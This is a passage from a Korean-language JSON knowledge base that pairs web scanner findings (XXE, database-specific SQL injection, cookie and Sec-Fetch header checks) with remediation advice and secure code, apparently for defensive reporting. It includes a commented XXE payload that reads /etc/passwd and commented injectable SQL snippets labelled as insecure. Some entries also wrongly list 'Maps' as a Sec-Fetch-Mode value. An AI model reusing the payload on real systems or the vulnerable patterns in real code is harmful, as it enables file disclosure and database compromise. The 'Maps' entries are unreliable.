      "**이스케이프 처리:** 사용자로부터 입력받은 데이터를 XML에 포함하기 전에 적절한 이스케이프 처리를 수행하여 XML 문법을 깨뜨리지 않도록 합니다.",
      "**최소 권한 원칙:** XML 파서가 접근할 수 있는 리소스에 대한 권한을 최소화합니다."
    ],
    "example_code_java": "import javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.ParserConfigurationException;\nimport org.xml.sax.SAXException;\nimport java.io.IOException;\nimport java.io.InputStream;\n\npublic class SecureXmlParser {\n    public static DocumentBuilder getSecureDocumentBuilder() throws ParserConfigurationException {\n        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n        \n        // XXE 방지 설정 (매우 중요)\n        try {\n            dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n            dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\n            dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\n            dbf.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);\n            dbf.setXIncludeAware(false);\n            dbf.setExpandEntityReferences(false);\n        } catch (ParserConfigurationException e) {\n            // 로깅 또는 예외 처리\n            e.printStackTrace();\n        }\n        \n        return dbf.newDocumentBuilder();\n    }\n\n    public static void parseSecurely(InputStream xmlStream) {\n        try {\n            DocumentBuilder db = getSecureDocumentBuilder();\n            db.parse(xmlStream);\n            System.out.println(\"XML parsed securely.\");\n        } catch (ParserConfigurationException | SAXException | IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "example_code_python_lxml": "from lxml import etree\n\ndef parse_secure_xml(xml_string):\n    # DTD 및 외부 엔티티를 처리하지 않도록 파서 설정\n    parser = etree.XMLParser(no_network=True, dtd_validation=False, load_dtd=False, resolve_entities=False)\n    try:\n        root = etree.fromstring(xml_string.encode('utf-8'), parser)\n        print(\"XML parsed securely:\")\n        print(etree.tostring(root, pretty_print=True).decode())\n    except etree.XMLSyntaxError as e:\n        print(f\"XML parsing error: {e}\")\n\n# 안전하지 않은 예시 (XXE 취약)\n# parse_secure_xml(\"\"\"\n# <?xml version=\\\"1.0\\\"?>\n# <!DOCTYPE foo [<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">]>\n# <root>&xxe;</root>\n# \"\"\")\n\n# 안전한 예시\nparse_secure_xml(\"<root><data>Hello</data></root>\")\n    "
  },
  "SQL Injection": {
    "translated": "SQL 인젝션 – SQL 쿼리를 조작하여 데이터베이스 내용을 열람, 조작하거나 시스템 명령을 실행할 수 있음",
    "description": "사용자 입력값을 통해 악의적인 SQL 쿼리가 실행될 수 있는 취약점으로, 데이터베이스에서 정보 유출, 데이터 조작, 서비스 거부 등을 유발할 수 있습니다.",
    "solution_guidelines": [
      "**준비된 문(Prepared Statements) 또는 매개변수화된 쿼리 사용:** 사용자 입력을 쿼리 문자열에 직접 연결하지 않고, 데이터베이스 드라이버가 입력값을 별도로 처리하도록 합니다. **이것이 SQL Injection을 방지하는 가장 효과적인 방법입니다.**",
      "**입력값 유효성 검사 (Input Validation):** 사용자 입력값을 서버 측에서 철저히 검사하여 예상되는 형식과 범위 내에 있는지 확인합니다. (예: 숫자만 허용, 특정 문자열 길이 제한 등)",
      "**최소 권한 원칙 (Principle of Least Privilege):** 데이터베이스 연결에 사용되는 계정에는 필요한 최소한의 권한만 부여하여, 설령 공격이 성공하더라도 피해를 최소화합니다.",
      "**오류 메시지 숨기기:** 민감한 데이터베이스 오류 메시지가 사용자에게 노출되지 않도록 일반적인 오류 메시지를 제공합니다."
    ],
    "example_code_java": "import java.sql.Connection;\nimport java.sql.PreparedStatement;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\n\npublic class SecureSQL {\n    public ResultSet getUser(Connection conn, String username) throws SQLException {\n        // 안전한 방법: Prepared Statement 사용\n        String sql = \"SELECT id, name, email FROM users WHERE username = ?\";\n        try (PreparedStatement pstmt = conn.prepareStatement(sql)) {\n            pstmt.setString(1, username); // 사용자 입력값은 매개변수로 바인딩\n            return pstmt.executeQuery();\n        }\n    }\n\n    // 보안에 취약한 예시 (절대 사용 금지)\n    // public ResultSet getInsecureUser(Connection conn, String username) throws SQLException {\n    // \t String sql = \"SELECT id, name, email FROM users WHERE username = '\" + username + \"'\";\n    // \t try (Statement stmt = conn.createStatement()) {\n    // \t \t return stmt.executeQuery(sql);\n    // \t }\n    // }\n}",
    "example_code_python": "import sqlite3\n\ndef get_user_secure(db_path, username):\n    conn = sqlite3.connect(db_path)\n    cursor = conn.cursor()\n    # 안전한 방법: 매개변수화된 쿼리 사용\n    cursor.execute(\"SELECT id, name, email FROM users WHERE username = ?\", (username,))\n    data = cursor.fetchone()\n    conn.close()\n    return data\n\ndef get_users_by_role_secure(db_path, role_id):\n    conn = sqlite3.connect(db_path)\n    cursor = conn.cursor()\n    # 숫자형 매개변수도 동일하게 안전하게 처리\n    cursor.execute(\"SELECT id, name FROM users WHERE role_id = ?\", (role_id,))\n    data = cursor.fetchall()\n    conn.close()\n    return data\n\n# 보안에 취약한 예시 (절대 사용 금지)\n# def get_user_insecure(db_path, username):\n# \t conn = sqlite3.connect(db_path)\n# \t cursor = conn.cursor()\n# \t cursor.execute(f\"SELECT id, name, email FROM users WHERE username = '{username}'\")\n# \t data = cursor.fetchone()\n# \t conn.close()\n# \t return data\n    "
  },
  "SQL Injection - Hypersonic SQL": {
    "translated": "SQL 인젝션 - Hypersonic SQL – Hypersonic SQL 데이터베이스에 대한 인젝션 공격",
    "description": "Hypersonic SQL 데이터베이스에 특화된 SQL Injection 취약점입니다. 일반적인 SQL Injection과 유사하게, 사용자 입력값을 통해 악의적인 SQL 쿼리가 실행됩니다.",
    "solution_guidelines": [
      "**준비된 문(Prepared Statements) 또는 매개변수화된 쿼리 사용:** Hypersonic SQL을 포함한 모든 데이터베이스에서 SQL Injection을 방지하는 가장 기본적인 방법입니다. 사용자 입력을 쿼리 문자열에 직접 연결하지 마십시오.",
      "**입력값 유효성 검사:** 예상되는 데이터 형식과 범위에 대한 엄격한 서버 측 유효성 검사를 수행합니다.",
      "**최소 권한 원칙:** Hypersonic SQL 데이터베이스에 연결하는 애플리케이션 계정에는 필요한 최소한의 권한만 부여합니다."
    ],
    "example_code_java": "// Hypersonic SQL도 JDBC를 지원하므로, 일반적인 JDBC Prepared Statement 사용 예시와 동일하게 적용됩니다.\nimport java.sql.Connection;\nimport java.sql.PreparedStatement;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\n\npublic class HypersonicSQLSecure {\n    public ResultSet getProduct(Connection conn, String productId) throws SQLException {\n        String sql = \"SELECT * FROM products WHERE product_id = ?\";\n        try (PreparedStatement pstmt = conn.prepareStatement(sql)) {\n            pstmt.setString(1, productId);\n            return pstmt.executeQuery();\n        }\n    }\n}\n    "
  },
  "SQL Injection - MsSQL": {
    "translated": "SQL 인젝션 - MsSQL – MsSQL 데이터베이스에 대한 인젝션 공격",
    "description": "Microsoft SQL Server에 특화된 SQL Injection 취약점입니다. MSSQL의 특정 구문(예: `GO`, `xp_cmdshell`, `sp_makewebtask` 등)을 이용한 공격이 가능할 수 있습니다.",
    "solution_guidelines": [
      "**준비된 문(Prepared Statements) 또는 매개변수화된 쿼리 사용:** .NET의 `SqlCommand`와 매개변수를 활용하는 것이 가장 효과적인 방어책입니다.",
      "**저장 프로시저 사용 (올바른 방식):** 저장 프로시저를 사용할 때, 입력 매개변수를 직접 SQL 문자열에 포함하지 않고 프로시저 내에서 매개변수화하여 사용하는 것이 중요합니다.",
      "**권한 최소화:** SQL Server 로그인에 최소한의 권한을 부여하고, `xp_cmdshell`과 같은 위험한 확장 프로시저를 비활성화하거나 접근을 제한합니다.",
      "**입력값 유효성 검사:** 서버 측에서 엄격한 입력값 유효성 검사를 수행합니다."
    ],
    "example_code_csharp_ado_net": "using System.Data;\nusing System.Data.SqlClient;\n\npublic class MsSqlSecure\n{\n    public DataTable GetUserData(string connectionString, string username)\n    {\n        DataTable dt = new DataTable();\n        string sql = \"SELECT UserID, Username, Email FROM Users WHERE Username = @Username\"; // @Username은 매개변수\n\n        using (SqlConnection conn = new SqlConnection(connectionString))\n        {\n            using (SqlCommand cmd = new SqlCommand(sql, conn))\n            {\n                cmd.Parameters.AddWithValue(\"@Username\", username); // 매개변수 바인딩\n                conn.Open();\n                using (SqlDataAdapter da = new SqlDataAdapter(cmd))\n                {\n                    da.Fill(dt);\n                }\n            }\n        }\n        return dt;\n    }\n\n    // 보안에 취약한 예시 (절대 사용 금지)\n    // public DataTable GetUserDataInsecure(string connectionString, string username)\n    // {\n    // \t DataTable dt = new DataTable();\n    // \t string sql = \"SELECT UserID, Username, Email FROM Users WHERE Username = '\" + username + \"'\";\n    // \t using (SqlConnection conn = new SqlConnection(connectionString))\n    // \t {\n    // \t \t using (SqlCommand cmd = new SqlCommand(sql, conn))\n    // \t \t {\n    // \t \t \t conn.Open();\n    // \t \t \t using (SqlDataAdapter da = new SqlDataAdapter(cmd))\n    // \t \t \t {\n    // \t \t \t \t da.Fill(dt);\n    // \t \t \t }\n    // \t \t }\n    // \t }\n    // \t return dt;\n    // }\n}",
    "example_code_sql_server_config": ""
  },
  "SQL Injection - MySQL": {
    "translated": "SQL 인젝션 - MySQL – MySQL 데이터베이스에 대한 인젝션 공격",
    "description": "MySQL 데이터베이스에 특화된 SQL Injection 취약점입니다. `LIMIT`, `INTO OUTFILE` 등의 MySQL 특정 구문을 이용한 공격이 가능할 수 있습니다.",
    "solution_guidelines": [
      "**준비된 문(Prepared Statements) 또는 매개변수화된 쿼리 사용:** PHP의 `PDO` 또는 `mysqli` 확장 기능, Python의 `mysql.connector` 등에서 제공하는 매개변수화된 쿼리를 사용하는 것이 가장 효과적입니다.",
      "**입력값 유효성 검사:** 서버 측에서 엄격한 입력값 유효성 검사를 수행합니다.",
      "**최소 권한 원칙:** MySQL 사용자 계정에 불필요한 권한(예: `FILE` 권한)을 부여하지 않습니다.",
      "**오류 메시지 숨기기:** MySQL 오류 메시지가 사용자에게 노출되지 않도록 합니다."
    ],
    "example_code_php_pdo": "<?php\n// 안전한 방법: PDO를 사용한 매개변수화된 쿼리\nfunction getUserData(PDO $pdo, string $username): array {\n    $stmt = $pdo->prepare(\"SELECT id, name, email FROM users WHERE username = :username\");\n    $stmt->bindParam(':username', $username, PDO::PARAM_STR);\n    $stmt->execute();\n    return $stmt->fetch(PDO::FETCH_ASSOC);\n}\n\n// 보안에 취약한 예시 (절대 사용 금지)\n// function getInsecureUserData(mysqli $mysqli, string $username): array {\n// \t $query = \"SELECT id, name, email FROM users WHERE username = '\" . $mysqli->real_escape_string($username) . \"'\";\n// \t $result = $mysqli->query($query);\n// \t return $result->fetch_assoc();\n// }\n?>\n    ",
    "example_code_python_mysql_connector": "import mysql.connector\n\ndef get_item_secure(conn, item_id):\n    cursor = conn.cursor()\n    # 안전한 방법: 매개변수화된 쿼리\n    sql = \"SELECT * FROM items WHERE item_id = %s\"\n    cursor.execute(sql, (item_id,))\n    result = cursor.fetchone()\n    cursor.close()\n    return result\n\n# 사용 예시\n# try:\n# \t conn = mysql.connector.connect(user='user', password='password',\n# \t \t \t \t \t \t \t \thost='127.0.0.1',\n# \t \t \t \t \t \t \t \tdatabase='testdb')\n# \t item_data = get_item_secure(conn, \"123\")\n# \t print(item_data)\n# except mysql.connector.Error as err:\n# \t print(f\"Error: {err}\")\n# finally:\n# \t if conn:\n# \t \t conn.close()\n    "
  },
  "SQL Injection - Oracle": {
    "translated": "SQL 인젝션 - Oracle – Oracle 데이터베이스에 대한 인젝션 공격",
    "description": "Oracle 데이터베이스에 특화된 SQL Injection 취약점입니다. Oracle의 다양한 함수 및 패키지(예: `DBMS_XMLGEN.GETXML`, `UTL_HTTP`)를 이용한 공격이 가능할 수 있습니다.",
    "solution_guidelines": [
      "**준비된 문(Prepared Statements) 또는 바인드 변수 사용:** Oracle 데이터베이스에서 SQL Injection을 방지하는 핵심은 바인드 변수를 사용하는 것입니다.",
      "**입력값 유효성 검사:** 서버 측에서 엄격한 입력값 유효성 검사를 수행합니다.",
      "**최소 권한 원칙:** Oracle 사용자 계정에 불필요한 권한(예: `CREATE ANY TABLE`, `EXECUTE` 특정 패키지)을 부여하지 않습니다.",
      "**공개된 권한 제거:** `PUBLIC` 그룹에 할당된 불필요한 권한을 제거합니다."
    ],
    "example_code_java_jdbc_oracle": "import java.sql.Connection;\nimport java.sql.PreparedStatement;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\n\npublic class OracleSQLSecure {\n    public ResultSet getEmployee(Connection conn, String employeeId) throws SQLException {\n        // 안전한 방법: 바인드 변수 사용\n        String sql = \"SELECT employee_name, department FROM employees WHERE employee_id = :employee_id\";\n        try (PreparedStatement pstmt = conn.prepareStatement(sql)) {\n            pstmt.setString(1, employeeId); // 바인드 변수 설정\n            return pstmt.executeQuery();\n        }\n    }\n}",
    "example_code_python_cx_oracle": "import cx_Oracle\n\ndef get_order_secure(cursor, order_id):\n    # 안전한 방법: 바인드 변수 사용\n    sql = \"SELECT * FROM orders WHERE order_id = :order_id\"\n    cursor.execute(sql, {'order_id': order_id})\n    result = cursor.fetchone()\n    return result\n\n# 사용 예시\n# try:\n# \t conn = cx_Oracle.connect(\"user/password@host:port/service_name\")\n# \t cursor = conn.cursor()\n# \t order_data = get_order_secure(cursor, \"ORD-001\")\n# \t print(order_data)\n# except cx_Oracle.Error as err:\n# \t print(f\"Error: {err}\")\n# finally:\n# \t if 'conn' in locals() and conn:\n# \t \t conn.close()\n    "
  },
  "SQL Injection - PostgreSQL": {
    "translated": "SQL 인젝션 - PostgreSQL – PostgreSQL 데이터베이스에 대한 인젝션 공격",
    "description": "PostgreSQL 데이터베이스에 특화된 SQL Injection 취약점입니다. PostgreSQL의 특정 함수(예: `pg_read_file`, `lo_export`)를 이용한 공격이 가능할 수 있습니다.",
    "solution_guidelines": [
      "**준비된 문(Prepared Statements) 또는 매개변수화된 쿼리 사용:** Python의 `psycopg2`, Java의 JDBC 등에서 제공하는 매개변수화된 쿼리를 사용하는 것이 가장 효과적입니다.",
      "**입력값 유효성 검사:** 서버 측에서 엄격한 입력값 유효성 검사를 수행합니다.",
      "**최소 권한 원칙:** PostgreSQL 사용자 계정에 불필요한 권한을 부여하지 않습니다.",
      "**데이터베이스 확장 기능 사용 주의:** `pl/pgSQL`과 같은 확장 기능 사용 시 보안에 유의하고, 필요 없는 경우 사용을 제한합니다."
    ],
    "example_code_python_psycopg2": "import psycopg2\n\ndef get_product_secure(conn, product_name):\n    cursor = conn.cursor()\n    # 안전한 방법: 매개변수화된 쿼리\n    sql = \"SELECT product_id, price FROM products WHERE product_name = %s\"\n    cursor.execute(sql, (product_name,))\n    result = cursor.fetchone()\n    cursor.close()\n    return result\n\n# 사용 예시\n# try:\n# \t conn = psycopg2.connect(dbname=\"testdb\", user=\"testuser\", password=\"password\")\n# \t product_data = get_product_secure(conn, \"Laptop\")\n# \t print(product_data)\n# except psycopg2.Error as e:\n# \t print(f\"Database error: {e}\")\n# finally:\n# \t if conn:\n# \t \t conn.close()\n    "
  },
  "SQL Injection - SQLite": {
    "translated": "SQL 인젝션 - SQLite – SQLite 데이터베이스에 대한 인젝션 공격",
    "description": "SQLite 데이터베이스에 특화된 SQL Injection 취약점입니다. SQLite는 파일 기반 데이터베이스로, 파일 시스템 접근 취약점과 결합될 경우 더 큰 위험을 초래할 수 있습니다.",
    "solution_guidelines": [
      "**준비된 문(Prepared Statements) 또는 매개변수화된 쿼리 사용:** Python의 `sqlite3` 모듈 등에서 제공하는 매개변수화된 쿼리를 사용하는 것이 가장 효과적입니다.",
      "**입력값 유효성 검사:** 서버 측에서 엄격한 입력값 유효성 검사를 수행합니다.",
      "**데이터베이스 파일 접근 제어:** SQLite 데이터베이스 파일에 대한 파일 시스템 권한을 최소화하여 인가되지 않은 접근을 방지합니다.",
      "**데이터베이스 경로 노출 금지:** 데이터베이스 파일의 절대 경로가 애플리케이션 오류 메시지 등을 통해 외부에 노출되지 않도록 합니다."
    ],
    "example_code_python_sqlite3": "import sqlite3\n\ndef get_settings_secure(db_path, key):\n    conn = sqlite3.connect(db_path)\n    cursor = conn.cursor()\n    # 안전한 방법: 매개변수화된 쿼리\n    cursor.execute(\"SELECT value FROM app_settings WHERE key = ?\", (key,))\n    result = cursor.fetchone()\n    conn.close()\n    return result\n\n# 사용 예시\n# db_file = 'app.db'\n# conn = sqlite3.connect(db_file)\n# conn.execute(\"CREATE TABLE IF NOT EXISTS app_settings (key TEXT PRIMARY KEY, value TEXT)\")\n# conn.execute(\"INSERT OR REPLACE INTO app_settings (key, value) VALUES (?, ?)\", ('theme', 'dark'))\n# conn.commit()\n# conn.close()\n\n# setting_value = get_settings_secure(db_file, \"theme\")\n# print(f\"Theme setting: {setting_value}\")\n    "
  },
  "SameSite Cookie Attribute Protection Used": {
    "translated": "SameSite 쿠키 속성 보호 사용됨 – SameSite 쿠키 속성이 올바르게 사용되어 CSRF 공격 방어에 기여함",
    "description": "웹 애플리케이션이 SameSite 쿠키 속성을 사용하여 Cross-Site Request Forgery (CSRF) 공격으로부터 보호되고 있음을 나타냅니다. 이는 긍정적인 보안 지표입니다.",
    "solution_guidelines": [
      "**SameSite 속성 적극 활용:** 모든 중요한 세션 쿠키 및 보안에 민감한 쿠키에 `SameSite=Lax` 또는 `SameSite=Strict` 속성을 적용합니다. 특히 사용자 세션 쿠키는 `Strict`가 가장 안전하나, 사용자 경험을 고려하여 `Lax`를 기본으로 사용하는 경우가 많습니다.",
      "**`Secure` 및 `HttpOnly` 속성과 함께 사용:** `SameSite` 속성만으로는 모든 공격을 막을 수 없으므로, `Secure` (HTTPS에서만 전송) 및 `HttpOnly` (JavaScript 접근 불가) 속성도 함께 사용하여 쿠키 보안을 강화합니다.",
      "**최신 브라우저 지원 확인:** `SameSite` 속성이 모든 브라우저에서 동일하게 동작하는지 확인하고, 필요시 폴백(fallback) 메커니즘을 고려합니다."
    ],
    "example_code_http_header": "Set-Cookie: sessionId=abcdef123456; SameSite=Lax; HttpOnly; Secure; Path=/\nSet-Cookie: csrfToken=xyz789; SameSite=Strict; HttpOnly; Secure; Path=/\n    ",
    "example_code_express_nodejs": "// Express.js 예시\nconst express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\n\napp.use(cookieParser());\n\napp.get('/login', (req, res) => {\n  // 로그인 성공 시 세션 쿠키 설정\n  res.cookie('sessionId', 'some_session_id', {\n    httpOnly: true,\n    secure: true, // HTTPS 환경에서만 전송\n    sameSite: 'Lax', // 또는 'Strict'\n    maxAge: 3600000 // 1시간\n  });\n  res.send('Logged in!');\n});\n    ",
    "example_code_php": "<?php\n// PHP 예시\n// 세션 쿠키 설정\nsession_set_cookie_params([\n    'lifetime' => 3600, // 1시간\n    'path' => '/',\n    'domain' => '',\n    'secure' => true,    // HTTPS 에서만 전송\n    'httponly' => true,  // JavaScript 접근 불가\n    'samesite' => 'Lax'  // 또는 'Strict'\n]);\nsession_start();\n\n// 다른 쿠키 설정\nsetcookie('user_preference', 'dark_mode', [\n    'expires' => time() + 86400 * 30,\n    'path' => '/',\n    'secure' => true,\n    'httponly' => true,\n    'samesite' => 'Lax'\n]);\n?>\n    "
  },
  "Script Served From Malicious Domain (polyfill)": {
    "translated": "악성 도메인에서 제공되는 스크립트 (polyfill) – Polyfill 스크립트가 악성 도메인에서 제공되어 보안 위험을 초래함",
    "description": "웹 애플리케이션이 악성으로 알려진 도메인(또는 해당 도메인으로 리다이렉션될 수 있는 도메인)으로부터 스크립트(주로 폴리필)를 로드하고 있음을 나타냅니다. 이는 스크립트 주입 공격의 위험을 증가시킵니다.",
    "solution_guidelines": [
      "**타사 스크립트 출처 검증:** 사용 중인 모든 타사 스크립트(특히 폴리필)의 CDN 또는 호스팅 도메인이 신뢰할 수 있고 안전한지 철저히 검증합니다.",
      "**콘텐츠 보안 정책 (Content Security Policy - CSP) 강화:** `script-src` 지시어를 사용하여 스크립트를 로드할 수 있는 신뢰할 수 있는 도메인을 명시적으로 제한합니다. 알려지지 않거나 의심스러운 도메인으로부터의 스크립트 로드를 차단합니다.",
      "**자체 호스팅 고려:** 민감한 애플리케이션의 경우, 가능한 한 모든 스크립트(폴리필 포함)를 자체 서버에서 호스팅하여 외부 도메인 의존성을 줄입니다.",
      "**Subresource Integrity (SRI) 사용:** 외부 스크립트를 로드할 때 `integrity` 속성을 사용하여 스크립트가 변조되지 않았음을 확인합니다. 이는 CDN 공급자가 손상된 경우에도 보호를 제공합니다."
    ],
    "example_code_html_csp_sri": "Content-Security-Policy: script-src 'self' https://trusted.cdn.com;\n\n<script src=\"https://trusted.cdn.com/polyfill.js\"\n         integrity=\"sha384-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"\n         crossorigin=\"anonymous\"></script>\n    "
  },
  "Sec-Fetch-Dest Header Has an Invalid Value": {
    "translated": "Sec-Fetch-Dest 헤더 값 부적절 – Fetch Metadata 헤더의 'Sec-Fetch-Dest' 값이 유효하지 않음",
    "description": "`Sec-Fetch-Dest` HTTP 요청 헤더에 유효하지 않은 값이 포함되어 있음을 나타냅니다. 이 헤더는 요청 대상의 종류(예: `document`, `script`, `style` 등)를 나타내며, 유효하지 않은 값은 잠재적인 변조 시도 또는 오작동을 의미할 수 있습니다.",
    "solution_guidelines": [
      "**유효한 값만 허용:** 서버 측에서 `Sec-Fetch-Dest` 헤더의 값을 검증하여 알려진 유효한 값들(예: `document`, `script`, `style`, `image`, `font`, `object`, `embed`, `audio`, `video`, `worker`, `serviceworker`, `sharedworker`, `xslt`, `frame`, `iframe`, `empty`)만 허용합니다.",
      "**경고 또는 요청 거부:** 유효하지 않은 값이 탐지될 경우, 이를 로깅하고 잠재적인 보안 위협으로 간주하여 요청을 거부하거나 경고를 발생시킵니다.",
      "**Fetch Metadata Headers 이해 및 활용:** `Sec-Fetch-Dest`를 포함한 Fetch Metadata Headers는 CSRF, XSSI (Cross-Site Script Inclusion) 등의 공격을 방어하는 데 활용될 수 있으므로, 이들 헤더의 의미와 활용법을 정확히 이해하고 애플리케이션 보안 로직에 반영합니다."
    ],
    "example_code_nodejs_express": "// Node.js Express 예시: Sec-Fetch-Dest 유효성 검사 미들웨어\napp.use((req, res, next) => {\n  const secFetchDest = req.headers['sec-fetch-dest'];\n  const validDestValues = [\n    'document', 'script', 'style', 'image', 'font', 'object', 'embed', 'audio', 'video',\n    'worker', 'serviceworker', 'sharedworker', 'xslt', 'frame', 'iframe', 'empty'\n  ];\n\n  if (secFetchDest && !validDestValues.includes(secFetchDest)) {\n    console.warn(`Invalid Sec-Fetch-Dest header value detected: ${secFetchDest} for URL: ${req.url}`);\n    // 잠재적 공격 시도로 간주하고 요청을 거부하거나 다른 조치 수행\n    // return res.status(400).send('Bad Request: Invalid Fetch-Dest header.');\n  }\n  next();\n});\n    "
  },
  "Sec-Fetch-Dest Header is Missing": {
    "translated": "Sec-Fetch-Dest 헤더 누락 – Fetch Metadata 헤더의 'Sec-Fetch-Dest'가 누락됨",
    "description": "`Sec-Fetch-Dest` HTTP 요청 헤더가 누락되어 있음을 나타냅니다. 이 헤더는 브라우저가 요청을 시작할 때 자동으로 추가하며, 누락은 비표준 요청, 구형 브라우저, 또는 특정 유형의 공격 시도를 의미할 수 있습니다.",
    "solution_guidelines": [
      "**정상적인 요청 여부 확인:** 모든 요청에 `Sec-Fetch-Dest` 헤더가 항상 존재해야 하는 것은 아닙니다 (예: 초기 문서 로드, 특정 API 호출). 따라서, 이 헤더가 누락된 것이 정상적인 시나리오인지, 아니면 비정상적인 요청(예: 직접적인 cURL 요청, 구형 봇, 특정 공격 도구)인지 맥락을 파악해야 합니다.",
      "**의도하지 않은 요청 차단:** 만약 특정 엔드포인트(예: CSRF에 취약할 수 있는 API)에서 `Sec-Fetch-Dest` 헤더가 예상되는데 누락되었다면, 이를 보안 위협으로 간주하고 요청을 거부하는 로직을 추가할 수 있습니다.",
      "**다른 Fetch Metadata Headers와 함께 분석:** `Sec-Fetch-Site`, `Sec-Fetch-Mode`, `Sec-Fetch-User` 헤더와 함께 종합적으로 분석하여 요청의 신뢰성을 판단합니다."
    ],
    "example_code_nodejs_express": "// Node.js Express 예시: 특정 API 엔드포인트에서 Sec-Fetch-Dest 헤더 누락 검사\napp.post('/api/sensitive_action', (req, res, next) => {\n  const secFetchDest = req.headers['sec-fetch-dest'];\n  const secFetchSite = req.headers['sec-fetch-site'];\n\n  // 예시: API 호출은 'empty' 또는 'xmlhttprequest' (Fetch API의 경우) 또는 'document' (폼 제출 등) 일 수 있음\n  // 여기서는 단순히 'empty' 또는 'script'가 아닌 경우를 예로 듭니다.\n  if (!secFetchDest || (secFetchDest !== 'empty' && secFetchDest !== 'script')) {\n      console.warn(`Missing or unexpected Sec-Fetch-Dest header for sensitive action: ${secFetchDest || 'MISSING'}`);\n      // return res.status(403).send('Forbidden: Incomplete request metadata.');\n  }\n  next();\n});\n    "
  },
  "Sec-Fetch-Mode Header Has an Invalid Value": {
    "translated": "Sec-Fetch-Mode 헤더 값 부적절 – Fetch Metadata 헤더의 'Sec-Fetch-Mode' 값이 유효하지 않음",
    "description": "`Sec-Fetch-Mode` HTTP 요청 헤더에 유효하지 않은 값이 포함되어 있음을 나타냅니다. 이 헤더는 요청 모드(예: `Maps`, `cors`, `no-cors`, `same-origin`)를 나타내며, 유효하지 않은 값은 잠재적인 변조 시도 또는 오작동을 의미할 수 있습니다.",
    "solution_guidelines": [
      "**유효한 값만 허용:** 서버 측에서 `Sec-Fetch-Mode` 헤더의 값을 검증하여 알려진 유효한 값들(예: `Maps`, `cors`, `no-cors`, `same-origin`, `websocket`)만 허용합니다.",
      "**경고 또는 요청 거부:** 유효하지 않은 값이 탐지될 경우, 이를 로깅하고 잠재적인 보안 위협으로 간주하여 요청을 거부하거나 경고를 발생시킵니다.",
      "**Fetch Metadata Headers 이해 및 활용:** 다른 Fetch Metadata Headers와 마찬가지로, 이 헤더도 요청의 컨텍스트를 이해하고 CSRF, XSSI 등의 공격을 방어하는 데 활용될 수 있습니다."
    ],
    "example_code_nodejs_express": "// Node.js Express 예시: Sec-Fetch-Mode 유효성 검사 미들웨어\napp.use((req, res, next) => {\n  const secFetchMode = req.headers['sec-fetch-mode'];\n  const validModeValues = ['navigate', 'cors', 'no-cors', 'same-origin', 'websocket'];\n\n  if (secFetchMode && !validModeValues.includes(secFetchMode)) {\n    console.warn(`Invalid Sec-Fetch-Mode header value detected: ${secFetchMode} for URL: ${req.url}`);\n    // return res.status(400).send('Bad Request: Invalid Fetch-Mode header.');\n  }\n  next();\n});\n    "
  },
  "Sec-Fetch-Mode Header is Missing": {
    "translated": "Sec-Fetch-Mode 헤더 누락 – Fetch Metadata 헤더의 'Sec-Fetch-Mode'가 누락됨",
    "description": "`Sec-Fetch-Mode` HTTP 요청 헤더가 누락되어 있음을 나타냅니다. 이 헤더는 브라우저가 요청 모드(예: `Maps`, `cors`)를 나타내기 위해 자동으로 추가합니다.",
    "solution_guidelines": [
      "**요청 유형에 따른 기대치 설정:** 모든 요청에 `Sec-Fetch-Mode` 헤더가 필수적으로 존재해야 하는 것은 아닙니다. 초기 문서 로드(`Maps`), Cross-Origin 리소스 요청(`cors`), Same-Origin 요청(`same-origin`) 등 요청 유형에 따라 예상되는 `Sec-Fetch-Mode` 값이 다릅니다.",
      "**예상치 못한 누락 시 경고 또는 거부:** 특정 보안에 민감한 엔드포인트(예: 상태 변경을 유발하는 POST 요청)에서 이 헤더가 예상되는데 누락되었다면, 이를 비정상적인 요청으로 간주하고 로깅하거나 요청을 거부할 수 있습니다.",
      "**다른 Fetch Metadata Headers와 종합 분석:** `Sec-Fetch-Site` 등 다른 Fetch Metadata Headers와 함께 분석하여 요청의 유효성을 판단합니다."
    ],
    "example_code_nodejs_express": "// Node.js Express 예시: 민감한 POST 요청에 대한 Sec-Fetch-Mode 헤더 검사\napp.post('/profile/update', (req, res, next) => {\n  const secFetchMode = req.headers['sec-fetch-mode'];\n  const secFetchSite = req.headers['sec-fetch-site'];\n\n  // CSRF 방지를 위해 'same-origin' 또는 'cors' (API 호출의 경우)를 기대할 수 있음\n  // 'navigate'는 폼 제출 시 나타날 수 있음\n  if (!secFetchMode || !['navigate', 'cors', 'same-origin'].includes(secFetchMode)) {\n      console.warn(`Missing or unexpected Sec-Fetch-Mode header for profile update: ${secFetchMode || 'MISSING'}`);\n      // return res.status(403).send('Forbidden: Request mode mismatch.');\n  }\n  next();\n});\n    "
  },
  "Sec-Fetch-Site Header Has an Invalid Value": {
    "translated": "Sec-Fetch-Site 헤더 값 부적절 – Fetch Metadata 헤더의 'Sec-Fetch-Site' 값이 유효하지 않음",
    "description": "`Sec-Fetch-Site` HTTP 요청 헤더에 유효하지 않은 값이 포함되어 있음을 나타냅니다. 이 헤더는 요청을 시작한 사이트와 현재 사이트 간의 관계(예: `same-origin`, `same-site`, `cross-site`, `none`)를 나타내며, 유효하지 않은 값은 잠재적인 변조 시도 또는 오작동을 의미할 수 있습니다.",
    "solution_guidelines": [
      "**유효한 값만 허용:** 서버 측에서 `Sec-Fetch-Site` 헤더의 값을 검증하여 알려진 유효한 값들(예: `same-origin`, `same-site`, `cross-site`, `none`)만 허용합니다.",
      "**경고 또는 요청 거부:** 유효하지 않은 값이 탐지될 경우, 이를 로깅하고 잠재적인 보안 위협으로 간주하여 요청을 거부하거나 경고를 발생시킵니다.",
